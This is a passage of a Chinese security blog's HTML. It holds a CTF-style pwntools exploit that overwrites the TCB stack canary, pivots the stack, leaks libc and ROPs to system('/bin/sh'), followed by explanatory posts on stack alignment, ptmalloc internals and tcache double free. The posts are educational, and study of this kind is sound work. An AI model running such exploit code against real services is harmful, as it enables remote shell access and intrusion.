class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os &#x3D; &#39;linux&#39;</span><br><span class="line">#context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line"># [&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; &#39;DEBUG&#39;</span><br><span class="line"></span><br><span class="line">libc_path &#x3D; &#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br><span class="line">bin_path &#x3D; &#39;.&#x2F;bs&#39;</span><br><span class="line"></span><br><span class="line">libc &#x3D; ELF(libc_path)</span><br><span class="line">binary &#x3D; ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host &#x3D; &#39;&#39;</span><br><span class="line">port &#x3D; 6666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug(command&#x3D;&#39;&#39;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line">    # debug(&#39;b *0x4009E7\n&#39;)</span><br><span class="line">    g &#x3D; lambda x: next(binary.search(asm(x, os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;)))</span><br><span class="line">    pop_rdi &#x3D; g(&#39;pop rdi; ret&#39;)</span><br><span class="line">    pop_rsi_pop &#x3D; g(&#39;pop rsi; pop r15; ret&#39;)</span><br><span class="line">    leave &#x3D; g(&#39;leave; ret&#39;)</span><br><span class="line">    ret &#x3D; 0x0000000000400287</span><br><span class="line">    log.info(&quot;pop_rdi:     &quot; + hex(pop_rdi))</span><br><span class="line">    log.info(&quot;pop_rsi_pop: &quot; + hex(pop_rsi_pop))</span><br><span class="line">    log.info(&quot;leave:       &quot; + hex(leave))</span><br><span class="line"></span><br><span class="line">    size &#x3D; 0x1850</span><br><span class="line">    p.sendlineafter(&#39;send?\n&#39;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf &#x3D; 0x602f00</span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; &#39;A&#39; * 0x1010</span><br><span class="line">    # stack pivot #step 1</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(binary.got[&#39;puts&#39;])</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;puts&#39;])</span><br><span class="line">    # ROP2 - read</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rsi_pop)</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;read&#39;])</span><br><span class="line">    # stack pivot #step 2</span><br><span class="line">    payload +&#x3D; p64(leave)</span><br><span class="line">    # Override TCB Canary</span><br><span class="line">    payload &#x3D; payload.ljust(size, &#39;A&#39;)</span><br><span class="line">    #print(&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    #print(&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.recvuntil(&#39;goodbye.\n&#39;)</span><br><span class="line">    leak &#x3D; p.recv(6)+&#39;\x00\x00&#39;</span><br><span class="line">    leak &#x3D; u64(leak)</span><br><span class="line">    #info(&quot;libc.address is %#x&quot;, libc.address)</span><br><span class="line">    #print(&quot;leak:&quot;, leak)</span><br><span class="line">    #print(&quot;sym:&quot;, libc.symbols[&#39;puts&#39;])</span><br><span class="line">    libc.address &#x3D; leak - libc.symbols[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line">    #print(&quot;leak:&quot;,leak)</span><br><span class="line">    #print(&quot;sym:&quot;,libc.symbols[&#39;puts&#39;])</span><br><span class="line">    info(&quot;libc.address is %#x&quot;, libc.address)</span><br><span class="line">    bin_sh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br><span class="line">    system &#x3D; libc.sym[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">    #payload &#x3D; &#39;&#39;</span><br><span class="line">    #payload +&#x3D; p64(0)</span><br><span class="line">    #payload +&#x3D; p64((libc.address+0x4f3c2))</span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(bin_sh)</span><br><span class="line">    payload +&#x3D; p64(ret)</span><br><span class="line">    payload +&#x3D; p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    #print (&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) &#x3D;&#x3D; 1:</span><br><span class="line">        global p</span><br><span class="line">        p &#x3D; process(executable&#x3D;bin_path, argv&#x3D;[bin_path])  # , env&#x3D;&#123;&#39;LD_PRELOAD&#39;:libc_path&#125;)</span><br><span class="line">    else:</span><br><span class="line">        p &#x3D; remote(sys.argv[1], int(sys.argv[2]))</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>运行后如下：</p>
-<p><img src="/image/bypass-Canary/pwn.png" alt="pwn"></p>
-<p>可以看到，成功getshell</p>
-<p>另外，对于上面所提到的rsp需要对齐16字节的问题，摘录一段NASM的原话如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The stack pointer %rsp must be aligned to a 16-byte boundary before making a call. </span><br><span class="line">Fine, but the process of making a call pushes the return address (8 bytes) on the stack,so when a function gets control, %rsp is not aligned. </span><br><span class="line">You have to make that extra space yourself, by pushing something or subtracting 8 from %rsp.</span><br></pre></td></tr></table></figure>
-
-<p>Linus在邮件中也提到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">On Tue, Jan 10, 2017 at 7:30 PM, Linus Torvalds</span><br><span class="line">&lt;torvalds@linux-foundation.org&gt; wrote:</span><br><span class="line">&gt;</span><br><span class="line">&gt; If you really want more stack alignment, you have to generate that</span><br><span class="line">&gt; alignment yourself by hand (and have a bigger buffer that you do that</span><br><span class="line">&gt; alignment inside).</span><br><span class="line"></span><br><span class="line">Side note: gcc can (and does) actually generate forced alignment using</span><br><span class="line">&quot;and&quot; instructions on %rsp rather than assuming pre-existing</span><br><span class="line">alignment.  And that would be valid.</span><br><span class="line"></span><br><span class="line">The problem with &quot;alignof(16)&quot; is not that gcc couldn&#39;t generate the</span><br><span class="line">alignment itself, it&#39;s just the broken &quot;it&#39;s already aligned to 16</span><br><span class="line">bytes&quot; assumption because -mpreferred-stack-boundary&#x3D;3 doesn&#39;t work.</span><br><span class="line"></span><br><span class="line">You *could* try to hack around it by forcing a 32-byte alignment</span><br><span class="line">instead. That (I think) will make gcc generate the &quot;and&quot; instruction</span><br><span class="line">mess.</span><br><span class="line"></span><br><span class="line">And it shouldn&#39;t actually use any more memory than doing it by hand</span><br><span class="line">(by having twice the alignment and hand-aligning the pointer).</span><br><span class="line"></span><br><span class="line">So we *could* try to just have a really hacky rule saying that you can</span><br><span class="line">align stack data to 8 or 32 bytes, but *not* to 16 bytes.</span><br><span class="line"></span><br><span class="line">That said, I do think that the &quot;don&#39;t assume stack alignment, do it by</span><br><span class="line">hand&quot; may be the safer thing. Because who knows what the random rules</span><br><span class="line">will be on other architectures.</span><br><span class="line"></span><br><span class="line">               Linus</span><br><span class="line">--</span><br></pre></td></tr></table></figure>
-
-
-
-<p>由于没有调试kernel,所以我暂且把这里的call认为其包含syscall系统调用，所以在call函数之前，必须保证rsp对齐，否则就有可能出现不可预期的错误</p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>64位下的pwn还是有很多需要注意的点，另外后面会尝试进一步调试kernel，看看syscall 0x38后到底是哪里由于rsp没有对齐造成了异常退出(估计多半也是像movaps之类的指令hh，权当猜测)</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/11/11/bypass-Canary/" data-id="ckhx9966z001qar5ydxw68xad" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/binary/" rel="tag">binary</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-ptmalloc" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/24/ptmalloc/" class="article-date">
-  <time datetime="2020-10-24T13:40:30.000Z" itemprop="datePublished">2020-10-24</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/24/ptmalloc/">ptmalloc机制闲扯</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="三个标志位"><a href="#三个标志位" class="headerlink" title="三个标志位"></a>三个标志位</h1><p>熟悉ptmalloc的都知道在ptmalloc分配的chunk header中的size部分有三bit标志位，分别为NON_MAIN_ARENA，IS_MAPPED，PREV_INUSE，这也算是ptmalloc的特征</p>
-<p>分别讲讲这三个标志位吧，首先是NON_MAIN_ARENA，要讲这个标志位，那就要先知道什么是main_arena.</p>
-<p>main_arena指程序主线程所申请并占据的内存空间，一般这个值为132kb，ptmalloc在程序主线程启动后向内核申请长度为132kb的堆空间，并将此堆空间作为此程序的main_arena,由ptmalloc来对其进行管理</p>
-<p>那么很显而易见的，NON_MAIN_ARENA指的就是当前堆块是否是在main_arena，0=no,1=yes</p>
-<p>再来讲讲IS_MAPPED这个标志位，这个标志位也很明显，表示此堆块是否为mmap分配，0=no，1=yes</p>
-<p>最后看看PREV_INUSE，乍一看是表示前一个堆块是否处于被allocated的状态，其实没错(笑)，就是这个意思，但要注意的一点是，这里指的前一个堆块是指物理地址上adajcent的堆块，而不是类似fastbins，tcachebins的链表上的堆块</p>
-<p>另外PREV_INUSE也可以作为堆块合并的参照之一，当其为0时，chunk header中的prev_size就是有效的，系统可以通过prev_size的值获得前一块堆块的长度(为1时不可，原因下面会说)</p>
-<h1 id="PREV-SIZE"><a href="#PREV-SIZE" class="headerlink" title="PREV_SIZE"></a>PREV_SIZE</h1><p>在chunk header中，除了三个标志位，还有一个地方需要关注，那就是第一个8(64位系统)字节的值，这个值代表了上一个堆块的长度，但是这个值仅当当前堆块的PREV_INUSE标志位为0时才有效</p>
-<p>那么为啥PREV_INUSE为1时无效呢</p>
-<p>主要是因为ptmalloc有一个特殊的机制，就是当前一个堆块处于allocated状态时，其可以“借用”当前堆块的PREV_SIZE所占据的空间(64位系统上为8字节)，这也是ptmalloc内存空间复用的一种手段，减少内存消耗</p>
-<p>其实一开始我觉得很奇怪且无法理解，因为在64位系统上分配堆空间时，需要16字节对齐，而如果又可以借用8字节，那么岂不是违反了内存对齐的规定(其实是把自己绕进去了hh，现在写下来觉得自己挺傻的)</p>
-<p>然而其实你可以把它看作一个约定，即分配堆空间时仍然遵循内存对齐的规则，但是也允许额外“溢出”一点空间，这里的溢出由ptmalloc保证不会出现异常</p>
-<p>看个例子可能更好理解</p>
-<p>这是一个结构体</p>
-<p><img src="/image/ptmalloc/struct.jpg" alt="struct"></p>
-<p>准备位这个结构体分配堆空间</p>
-<p><img src="/image/ptmalloc/beforemalloc-code.jpg" alt="beforemalloc-code"></p>
-<p>为这个结构体分配堆空间之前，tcache的情况</p>
-<p><img src="/image/ptmalloc/beforemalloc-tcache.jpg" alt="beforemalloc-tcache"></p>
-<p>分配堆空间之后，tcache的情况</p>
-<p><img src="/image/ptmalloc/aftermalloc-tcache.jpg" alt="aftermalloc-tcache"></p>
-<p>此时其实msg_moduleinit这个指针已经指向了位于0x55555575ecb0的堆空间(没截图，但从tcache上可以看出来)，但是，如果细心一点你会发现，msg_moduleinit的结构体类型应当占用的堆空间为4+4+8+8+16=40字节(16是chunk header的长度)</p>
-<p>但是从tcache中我们可以看到位于0x55555575ecb0的堆空间只有0x20，32字节大小，那就很奇怪，咋少了8个字节呢？</p>
-<p>不急，慢慢看下去</p>
-<p>这是分配后，msg_moduleinit指向的堆空间情况</p>
-<p><img src="/image/ptmalloc/oriheap.jpg" alt="oriheap"></p>
-<p>跟进unpack_moduledatainitreq_mess函数</p>
-<p><img src="/image/ptmalloc/unpack.jpg" alt="unpack"></p>
-<p>这里将msg_moduleinit传入了unpack_moduledatainitreq_mess函数</p>
-<p>跟进unpack_moduledatainitreq_mess函数</p>
-<p><img src="/image/ptmalloc/unpack-1.jpg" alt="unpack-1"></p>
-<p>可以看到这里一波操作，将ntohl(*(uint32_t *)statusBuff)的值赋给了mess结构体的Status(就是msg_moduleinit的Status，为了叙述方便，后面改用msg_moduleinit来指代)</p>
-<p>之后继续看下去</p>
-<p><img src="/image/ptmalloc/unpack-2.jpg" alt="unpack-2"></p>
-<p>又是一波操作，将值赋给了msg_moduleinit的ModuleNameLen</p>
-<p>此时msg_moduleinit所指向的堆空间已经变为了如下这样</p>
-<p><img src="/image/ptmalloc/firstchange.jpg" alt="firstchange"></p>
-<p>可以看到低位的八个字节已经被重新赋值为了新的Status以及ModuleNameLen的值(分别为十进制的1和13)</p>
-<p>继续</p>
-<p><img src="/image/ptmalloc/unpack-3.jpg" alt="unpack-3"></p>
-<p>操作一波，将moduleNameBuff所指向的地址赋值给msg_moduleinit的ModuleName指针</p>
-<p>此时msg_moduleinit所指向的堆空间已经变为了如下这样</p>
-<p><img src="/image/ptmalloc/secondchange.jpg" alt="secondchange"></p>
-<p>可以看到0x55555575ecb8-0x55555575ecc0的八个字节已经被赋值为了moduleNameBuff所指向的地址</p>
-<p>到这里，ptmalloc分配的0x20长度的堆空间已经霍霍完了，但是还有一个Size(占8个字节)无处安放，那它会被放在哪里呢？</p>
-<p>Move on</p>
-<p><img src="/image/ptmalloc/unpack-4.jpg" alt="unpack-4"></p>
-<p>可以看到这里操作了一波，将htobe64(*(uint64_t *)sizeBuff)的值赋给了msg_moduleinit的Size</p>
-<p>此时msg_moduleinit指向的堆空间如下</p>
-<p><img src="/image/ptmalloc/final.jpg" alt="final"></p>
-<p>可以看见，代表msg_moduleinit的Size的八个字节，“溢出”了原本ptmalloc分配给msg_moduleinit的0x20长度，占据了下一个堆块的prev_size的空间，奇特，但合法 XD</p>
-<p>并且，哪怕将msg_moduleinit给free了之后，被“溢出”的8个字节也并不会变为原本应该标示的，msg_moduleinit所指向的堆块的长度(即prev_size本身应该表示的东西)</p>
-<p><img src="/image/ptmalloc/afterfree.jpg" alt="afterfree"></p>
-<p>上图中53行已经free掉了msg_moduleinit，free完之后，msg_moduleinit所指向的堆空间以及其后一个堆空间的情况如下图所示</p>
-<p><img src="/image/ptmalloc/nah.jpg" alt="nah"></p>
-<p>可以看到，msg_moduleinit所指向的堆空间的下一个堆空间的prev_size并没有在msg_moduleinit被释放后被修改为msg_moduleinit所指向的堆空间的长度，而是仍然保持值“溢出”时0x00000000000032b0的值</p>
-<p>然而按规定，当前一个堆块被free后，当前堆块的prev_size应该要变为前一个堆块的长度，且将PREV_INUSE置零</p>
-<p>出现这种现象是因为tcachebins与fastbins有一个特点，就是放入这两个bins的堆块不会被标记为空闲，PREV_INUSE不会被置零，而是一直保持着allocated的状态，并且也不会主动合并空闲堆块</p>
-<p>从tcache的情况也可以看出这个特点</p>
-<p><img src="/image/ptmalloc/aaa.jpg" alt="aaa"></p>
-<p>可以看到，虽然0x55555575ecb0和0x55555575ecd0这两个堆块物理上相邻，且0x55555575ecb0刚刚被释放(就是msg_moduleinit所指向的堆块),但是此时0x55555575ecd0堆块上的PREV_INUSE标志位仍然置1，而不是我们想象中的0</p>
-<p>所以这里被“溢出”的，本来表示前一堆块的prev_size的值并没有改变，而是继续保留原来“溢出”后的值</p>
-<h1 id="头chunk"><a href="#头chunk" class="headerlink" title="头chunk"></a>头chunk</h1><p>除了fastbins以及tcachebins以外，small、big、unsorted这几个bins都是由双向链表组成的，而双向链表的头chunk结构当然也需要研究一番</p>
-<p>首先bins的所有状态都会被记录在malloc_state这个结构体中，结构体如下(NBINS为128)：</p>
-<p><img src="/image/ptmalloc/mallocstate.jpg" alt="mallocstate"></p>
-<p>malloc_state在内存中部分分布状况：</p>
-<p><img src="/image/ptmalloc/mallocstatemem.jpg" alt="mallocstatemem"></p>
-<p>根据结构体构成来看</p>
-<p>0x7ffff7dcfc40-0x7ffff7dcfc48为__libc_lock_define (, mutex)占据,该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。</p>
-<p>0x7ffff7dcfc48-0x7ffff7dcfc50为flag,其记录了分配区的一些标志，比如 bit0 记录了分配区是否有 fast bin chunk ，bit1 标识分配区是否能返回连续的虚拟地址空间。具体如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="line">   some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="line">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="line">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="line">   upon startup (since statics are zero-filled), simplifying</span><br><span class="line">   initialization checks.</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">#define FASTCHUNKS_BIT (1U)</span><br><span class="line"></span><br><span class="line">#define have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) &#x3D;&#x3D; 0)</span><br><span class="line">#define clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="line">#define set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span><br><span class="line">   regions.  Otherwise, contiguity is exploited in merging together,</span><br><span class="line">   when possible, results from consecutive MORECORE calls.</span><br><span class="line">   The initial value comes from MORECORE_CONTIGUOUS, but is</span><br><span class="line">   changed dynamically if mmap is ever used as an sbrk substitute.</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">#define NONCONTIGUOUS_BIT (2U)</span><br><span class="line"></span><br><span class="line">#define contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) &#x3D;&#x3D; 0)</span><br><span class="line">#define noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) !&#x3D; 0)</span><br><span class="line">#define set_noncontiguous(M) ((M)-&gt;flags |&#x3D; NONCONTIGUOUS_BIT)</span><br><span class="line">#define set_contiguous(M) ((M)-&gt;flags &amp;&#x3D; ~NONCONTIGUOUS_BIT)</span><br><span class="line"></span><br><span class="line">&#x2F;* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span><br><span class="line">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span><br><span class="line">   allocated in that arena before detecting corruption are not freed.  *&#x2F;</span><br><span class="line"></span><br><span class="line">#define ARENA_CORRUPTION_BIT (4U)</span><br><span class="line"></span><br><span class="line">#define arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span><br><span class="line">#define set_arena_corrupt(A) ((A)-&gt;flags |&#x3D; ARENA_CORRUPTION_BIT)</span><br></pre></td></tr></table></figure>
-
-<p>0x7ffff7dcfc50-0x7ffff7dcfca0为fastbins的头节点数组</p>
-<p>0x7ffff7dcfca0-0x7ffff7dcfca8为top chunk的起始地址</p>
-<p>0x7ffff7dcfca8-0x7ffff7dcfcb0为last remainder的起始地址</p>
-<p>0x7ffff7dcfcb0之后则为bins数组，里面存储了所有small、big、unsorted bins的头节点信息</p>
-<p>这里要注意一点就是，这里的头节点与可分配的堆块节点不同，这里的头节点只是双向链表的起点，在malloc的时候分配的都是头节点指向的下一个节点及之后的节点，头节点永远指向可分配堆块的第一块以及最后一块</p>
-<p>此时unsortedbins的情况：</p>
-<p><img src="/image/ptmalloc/unsortedbins.jpg" alt="unsortedbins"></p>
-<p>这里还要注意的一个地方就是，unsortedbins占据bin数组的下标为1处，即0x7ffff7dcfcb0-0x7ffff7dcfcc0</p>
-<p>small bins占据62个，largebins占据63个</p>
-<p>可以从上图以及malloc_state分布状况中看出，unsortedbins头节点已经标示了第一个待分配堆块的地址0x0000555555756870，同时标示了最后一个待分配堆块的地址0x0000555555756250</p>
-<p>综上可以看出，每一条bins链的头节点结构与普通的堆块节点结构是不相同的，这里有一个解释( <a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/#chunk">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/#chunk</a> ),但我私以为其中的解释有些许绕，并且也不是prev_size和size重用的问题</p>
-<p>实际上头节点的构造与普通堆块的构造本来就不相同，普通堆块的prev_size以及size这两个区域在头节点这里本身就没有实现。</p>
-<p>所以如果要操作头节点，务必不能误以为其结构与普通堆节点相同，从而去操作其prev_size以及size的值，因为从内存分布的角度来看，头节点的prev_size和size实际上是top chunk以及last remainder的内存位置(unsortedbins)，或者就是前一条bin链的头节点结构(small、largebins)，<br>随意操作将会导致malloc_state结构错乱，发生不可预期的错误</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>learn pwn,and be well</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/10/24/ptmalloc/" data-id="ckhx9966e000sar5y2reffufy" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/binary/" rel="tag">binary</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Double-free" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/23/Double-free/" class="article-date">
-  <time datetime="2020-10-23T11:08:20.000Z" itemprop="datePublished">2020-10-23</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/23/Double-free/">Double free</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>仅记录自己调试程序的一个double free漏洞的问题</p>
-<h1 id="Tcachebins"><a href="#Tcachebins" class="headerlink" title="Tcachebins"></a>Tcachebins</h1><p>对于稍微了解linux堆内存管理的人来说，fastbins这个词一定不陌生，而在libc2.26之后，一个新的机制 <strong>Tcachebins</strong>被引入了，Tcachebins和fastbins很像，但优先级在fastbins之前。</p>
-<p>被free的适当大小的内存块会优先被放入Tcachebins，且Tcachebins的每一个链上可以最多链接7个堆块，只有当Tcachebins满了之后，再free的内存块才会被放入fastbins及unsorted bins</p>
-<p>在malloc时，也会优先取Tcachebins中的内存块</p>
-<p>Tcachebins和fastbins一样，仅基于fd指针构造单链表，且遵循LIFO的原则</p>
-<h1 id="ptmalloc堆结构"><a href="#ptmalloc堆结构" class="headerlink" title="ptmalloc堆结构"></a>ptmalloc堆结构</h1><p>如下图所示：</p>
-<p><img src="/image/doubleFree/heap.jpg" alt="heap"></p>
-<p>在图中，prev_size以及size构成了chunk头：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.prev_size    只有在前一个堆块是空闲时才会有值，用来指示前一个堆块的大小</span><br><span class="line">2.size         当前chunk的大小（包括chunk header的长度）。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息</span><br></pre></td></tr></table></figure>
-
-<p>prev_size与size分别占据8字节的长度，即chunk头为0x10长.</p>
-<p>prev_size所占据的8个字节在prev chunk处在in-use的情况下是无用的，可以被prev chunk使用</p>
-<p>size的后三bit有特殊用途，被用于存储其他信息,如下图所示：</p>
-<p><img src="/image/doubleFree/chunkheader.jpg" alt="chunkheader"></p>
-<p>这三位的作用是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.NON_MAIN_ARENA     这个堆块是否位于主线程</span><br><span class="line">2.IS_MAPPED          记录当前 chunk 是否是由 mmap 分配的</span><br><span class="line">3.PREV_INUSE         记录前一个 chunk 块是否被分配</span><br></pre></td></tr></table></figure>
-
-<p>如果当前chunk处于未被使用状态，则mem前8 bytes被用来存储其他信息，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd:     下一个未被使用的chunk的地址</span><br><span class="line">bk:     上一个未被使用的chunk的地址</span><br></pre></td></tr></table></figure>
-
-<p>一般我们使用void *x = malloc(1)，获得的指针地址指向的是fd的开头，chunk header为ptmalloc自动分配</p>
-<p>另外，在malloc时，根据操作系统的位数，有一个最小分配空间的概念，在64位上=16字节，32位=8字节，即哪怕malloc(0)，也会按照最小值分配</p>
-<h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><h2 id="下断点至第一次free"><a href="#下断点至第一次free" class="headerlink" title="下断点至第一次free"></a>下断点至第一次free</h2><p><img src="/image/doubleFree/firstfree.jpg" alt="firstfree"></p>
-<p>此时，tcache如下图所示</p>
-<p><img src="/image/doubleFree/firstfree-tcache.jpg" alt="firstfree-tcache"></p>
-<p>moduleNameBuff指向的地址内容如下所示：</p>
-<p><img src="/image/doubleFree/firstfree-mnb.jpg" alt="firstfree-mnb"></p>
-<h2 id="第一次free后"><a href="#第一次free后" class="headerlink" title="第一次free后"></a>第一次free后</h2><p><img src="/image/doubleFree/afterfirstfree-code.jpg" alt="afterfirstfree-code"></p>
-<p>tacache如下所示：</p>
-<p><img src="/image/doubleFree/afterfirstfree-tcache.jpg" alt="afterfirstfree-tcache"></p>
-<p>原moduleNameBuff所指向的地址(0x55555575ecd0)，这里-0x10是为了指向chunk头</p>
-<p><img src="/image/doubleFree/afterfirstfree-mnb.jpg" alt="afterfirstfree-mnb"></p>
-<p>可以看到对应上面提到的堆结构，fd指针已经指向了tcachebins中的下一块未被使用的堆地址(0x000055555575ed70)</p>
-<h2 id="下断点并运行至第二次free"><a href="#下断点并运行至第二次free" class="headerlink" title="下断点并运行至第二次free"></a>下断点并运行至第二次free</h2><p><img src="/image/doubleFree/secondfree-code.jpg" alt="secondfree-tcache"></p>
-<p>此时tcache如下图所示：</p>
-<p><img src="/image/doubleFree/secondfree-tcache.jpg" alt="secondfree-tcache"></p>
-<p>地址0x55555575ecd0-0x10如下所示：</p>
-<p><img src="/image/doubleFree/secondfree-mnb.jpg" alt="secondfree-mnb"></p>
-<p>此时可以看到，由于4-5步之间我还进行了其他的操作，所以导致tcache链上增加了其他的几个空闲块，且此时将要被double free的内存块并未有异常</p>
